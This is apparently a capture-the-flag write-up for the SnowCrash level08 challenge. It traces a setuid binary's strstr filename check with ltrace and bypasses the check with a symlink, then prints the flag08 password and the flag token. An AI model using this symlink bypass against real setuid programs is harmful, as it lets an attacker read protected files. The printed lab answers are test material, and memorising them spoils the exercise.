After logging to level08 we find a suid binary (level08) that read files

Also there's file called token that possibily contains the password for flag08 user

Let's try and execute the binary with token

```
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$
```

It's seems that there's security check that prevent us from catting the token file and get the password

After running ltrace to figure out the security check, we found that it searchs for 'token' in the entered filname and if it matches it prevent us from printing it's content

```
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                        = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                    = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$
```

The only way to print the content of the token file, is by creating a symbolic link and execute the binary with it as follow

```
level08@SnowCrash:~$ ln -s ~/token /tmp/pass
level08@SnowCrash:~$ ./level08 /tmp/pass
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$
```

Let's log in to flag08 and get the flag.

```
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$
```